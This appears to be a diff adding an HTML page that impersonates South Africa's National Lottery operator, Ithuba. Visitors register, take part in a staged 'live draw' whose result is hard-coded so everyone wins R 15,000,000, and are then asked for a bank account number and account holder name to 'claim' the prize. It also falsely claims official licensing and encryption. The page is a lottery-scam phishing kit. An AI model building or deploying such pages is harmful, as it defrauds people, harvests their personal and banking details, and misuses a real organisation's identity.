@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SA National Lottery - Ithuba</title>
+<meta name="description" content="South African National Lottery - Official Licensed Operator">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<!-- COMMON HEADER -->
+<header class="header">
+ <div class="header-top">
+  <div class="top-left">
+   <span>📞 0861 101 101</span>
+   <span style="margin-left: 15px;">✉ info@nationallottery.co.za</span>
+  </div>
+  <div class="top-right">OFFICIAL LICENSED NATIONAL LOTTERY</div>
+ </div>
+ <div class="header-main">
+  <div class="logo">
+   <img src="https://ik.imagekit.io/gqguwgx48/logo.jpg" alt="SA National Lottery Logo" class="logo-img">
+   <div class="logo-text-group">
+    <span class="logo-text">SA National Lottery</span>
+    <span class="logo-subtext">Official Licensed Operator</span>
+   </div>
+  </div>
+  <div class="jackpot-badge">
+   <small>JACKPOT PRIZE</small>
+   <strong>🏆 R 150,000,000</strong>
+  </div>
+ </div>
+ <div class="header-bar"></div>
+</header>
+
+<main class="main-content">
+ <!-- ====== SCREEN 1: REGISTRATION ====== -->
+ <div id="screen1" class="screen active">
+  <div class="card">
+   <div class="card-icon">👤</div>
+   <h1>Lottery Registration</h1>
+   <p class="subtitle">Complete the form below to enter the official draw</p>
+   <form id="regForm" novalidate>
+    <label>👤 Full Name</label>
+    <input type="text" id="fullName" placeholder="Your full name" required>
+    <div class="error" id="errName"></div>
+    <label>📞 Mobile Number</label>
+    <input type="tel" id="mobile" placeholder="E.g: 082 123 4567" required>
+    <div class="error" id="errMobile"></div>
+    <label>📅 Age</label>
+    <input type="number" id="age" placeholder="Your age" min="18" required>
+    <div class="error" id="errAge"></div>
+    <label>📍 Select your Province</label>
+    <select id="province" required>
+     <option value="">Select a province</option>
+     <option>Eastern Cape</option><option>Free State</option>
+     <option>Gauteng</option><option>KwaZulu-Natal</option>
+     <option>Limpopo</option><option>Mpumalanga</option>
+     <option>Northern Cape</option><option>North West</option>
+     <option>Western Cape</option>
+    </select>
+    <div class="error" id="errProv"></div>
+    <button type="submit" class="btn btn-green">Confirm Registration</button>
+   </form>
+   <p class="secure-text">🔒 Your information is securely encrypted</p>
+  </div>
+ </div>
+
+ <!-- ====== SCREEN 2: PRIZES ====== -->
+ <div id="screen2" class="screen">
+  <div class="card">
+   <div class="card-icon">🏆</div>
+   <h1>You Can Win One Of These Prizes</h1>
+   <p class="subtitle">Enter now and compete in the official electronic draw</p>
+   <div class="prize-list">
+    <div class="prize gold"><span class="prize-pos">🥇 Position 1</span><span class="prize-label">First Prize</span><span class="prize-val">R 150,000,000</span></div>
+    <div class="prize silver"><span class="prize-pos">🥈 Position 2</span><span class="prize-label">Second Prize</span><span class="prize-val">R 60,000,000</span></div>
+    <div class="prize bronze"><span class="prize-pos">🥉 Position 3</span><span class="prize-label">Third Prize</span><span class="prize-val">R 30,000,000</span></div>
+    <div class="prize"><span class="prize-pos">🏆 Position 4</span><span class="prize-label">Fourth Prize</span><span class="prize-val">R 15,000,000</span></div>
+    <div class="prize"><span class="prize-pos">🎯 Position 5</span><span class="prize-label">Fifth Prize</span><span class="prize-val">R 6,000,000</span></div>
+   </div>
+   <button class="btn btn-blue" onclick="goTo(3)">ENTER THE DRAW</button>
+  </div>
+ </div>
+
+ <!-- ====== SCREEN 3: LUCKY NUMBER ====== -->
+ <div id="screen3" class="screen">
+  <div class="card">
+   <div class="card-icon hashtag-icon">#</div>
+   <h1>Choose Your Lucky Number</h1>
+   <p class="subtitle">Pick a number from 1 to 1000 to enter the electronic draw</p>
+   <form id="luckyForm" novalidate>
+    <label>Lucky Number (1 – 1000)</label>
+    <input type="number" id="luckyNum" class="large-input" placeholder="000" min="1" max="1000" required>
+    <div class="error" id="errLucky"></div>
+    <p class="info-text">Your number will be used in the official electronic draw</p>
+    <button type="submit" class="btn btn-green">Confirm Number</button>
+   </form>
+  </div>
+ </div>
+
+ <!-- ====== SCREEN 4: DRAW RESULT ====== -->
+ <div id="screen4" class="screen">
+  <div class="card" id="drawCard">
+   <!-- CONFETTI CANVAS -->
+   <canvas id="confettiCanvas"></canvas>
+   <!-- DRAW ANIMATION -->
+   <div id="drawAnim" class="draw-anim">
+    <div class="card-icon">🔄</div>
+    <h1>Live Draw in Progress</h1>
+    <p class="subtitle" style="color:#0a7e55">The electronic draw is being conducted now...</p>
+    <div class="drum-container">
+     <div class="drum-handle"></div>
+     <div class="drum" id="drum">
+      <div class="drum-shine"></div>
+      <!-- Balls inserted by JS -->
+     </div>
+     <div class="drum-base"></div>
+    </div>
+    <div class="live-indicator"><span class="live-dot"></span> LIVE DRAW</div>
+   </div>
+   <!-- RESULT -->
+   <div id="drawResult" style="display:none">
+    <div class="card-icon">🏆</div>
+    <h1>Draw Complete!</h1>
+    <div class="drum-container drum-result">
+     <div class="drum-handle"></div>
+     <div class="drum" id="drumResult">
+      <div class="drum-shine"></div>
+      <div class="winning-ball"><span id="winningNumberSpan">2</span></div>
+     </div>
+     <div class="drum-base"></div>
+    </div>
+    
+    <div class="winner-card">
+     <div class="winner-tag">✓ WINNER CONFIRMED</div>
+     <h2 id="congratsName">CONGRATULATIONS!</h2>
+     <p class="result-text">You have won the <strong>Fourth Prize</strong> of</p>
+     <div class="prize-amount-glow">R 15,000,000</div>
+     <p class="result-subtext">in the South African National Lottery draw</p>
+    </div>
+    <button class="btn btn-gold" onclick="goTo(5)">🏆 CLAIM MY PRIZE</button>
+   </div>
+  </div>
+ </div>
+
+ <!-- ====== SCREEN 5: PAYMENT ====== -->
+ <div id="screen5" class="screen">
+  <div class="card">
+   <div class="card-icon hashtag-icon" style="font-size:24px;">💳</div>
+   <h1>Payment Method</h1>
+   <p class="subtitle">Choose how you would like to receive your prize of R 15,000,000</p>
+   <form id="payForm" onsubmit="event.preventDefault(); claimPrize();">
+    <label>Payment Method</label>
+    <div class="payment-methods">
+     <label class="pay-opt" id="optBank">
+      <input type="radio" name="payMethod" value="bank" checked onchange="togglePay()">
+      <div class="pay-box selected"><span style="font-size:20px;margin-bottom:8px">📱</span>Bank Transfer</div>
+     </label>
+     <label class="pay-opt" id="optCheque">
+      <input type="radio" name="payMethod" value="cheque" onchange="togglePay()">
+      <div class="pay-box"><span style="font-size:20px;margin-bottom:8px">💳</span>Cheque</div>
+     </label>
+    </div>
+    <div id="paymentFields">
+     <label id="acctLabel">Bank Account Number</label>
+     <input type="text" id="bankAcct" placeholder="E.g: 082 123 4567" required>
+     <label>Account Holder Name</label>
+     <input type="text" id="holderName" placeholder="Full name of account holder" required>
+    </div>
+    <button type="submit" class="btn btn-gold" style="color:#0b5c36;font-weight:900;">CLAIM MY R 15,000,000</button>
+   </form>
+   <p class="secure-text">🔒 256-bit SSL encrypted transfer</p>
+  </div>
+ </div>
+</main>
+
+<!-- COMMON FOOTER -->
+<footer class="footer">
+ <div class="footer-grid">
+  <div class="footer-col">
+   <h3>Customer Support</h3>
+   <p>📞 0861 101 101</p>
+   <p>✉ info@nationallottery.co.za</p>
+  </div>
+  <div class="footer-col">
+   <h3>Security</h3>
+   <p>✅ Licensed Draws</p>
+   <p>🔒 SSL Certified</p>
+  </div>
+  <div class="footer-col">
+   <h3>About Us</h3>
+   <p>Official lottery platform in South Africa. Transparency and security guaranteed.</p>
+  </div>
+ </div>
+ <div class="footer-bottom">© 2025 South African National Lottery · Play responsibly · 18+</div>
+</footer>
+
+<script src="script.js"></script>
+</body>
+</html>
